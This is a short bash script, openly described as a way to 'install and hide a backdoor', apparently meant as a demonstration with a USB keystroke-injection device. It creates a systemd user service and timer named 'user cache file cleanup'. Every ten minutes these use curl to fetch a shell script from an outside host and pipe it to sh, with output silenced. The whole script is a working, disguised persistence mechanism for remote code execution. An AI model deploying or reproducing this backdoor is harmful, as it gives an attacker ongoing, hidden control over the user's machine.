#!/bin/bash
#########################################################################################
# DESC: install and hide a backdoor in user context ***JUST FOR EDUCATION***
# WHO: chris@bitbull.ch
#########################################################################################
# Copyright (c) Chris Ruettimann <chris@bitbull.ch>

# This software is licensed to you under the GNU General Public License.
# There is NO WARRANTY for this software, express or
# implied, including the implied warranties of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. You should have received a copy of GPLv2
# along with this software; if not, see
# http://www.gnu.org/licenses/gpl.txt

# Note the url below, there you can place any shell comands that get executed every 10min
# I used this for a PoC with WifiDuck to demonstrate how easy code can get installed.
#    https://dstike.com/collections/frontpage/products/dstike-wifi-duck
# If you write example in Powershell, drop me a line, would be nice.
# Thanks Chris



mkdir -p $HOME/.config/systemd/user/
cd $HOME/.config/systemd/user/

echo "[Unit]
Description=user cache file cleanup

[Service]
Type=simple
ExecStart=/bin/sh -c '/usr/bin/curl -k -L -s https://www.bitbull.ch/wifiducky.sh | sh 2>&1 2>/dev/null ; exit 0'

[Install]
WantedBy=default.target

" > cache_cleanup.service

echo "[Unit]
Description=user cache file cleanup

[Timer]
OnBootSec=60
OnUnitActiveSec=600

Unit=cache_cleanup.service

[Install]
WantedBy=timers.target
" > cache_cleanup.timer
systemctl --user daemon-reload
systemctl --user enable cache_cleanup.service
systemctl --user enable cache_cleanup.timer --now



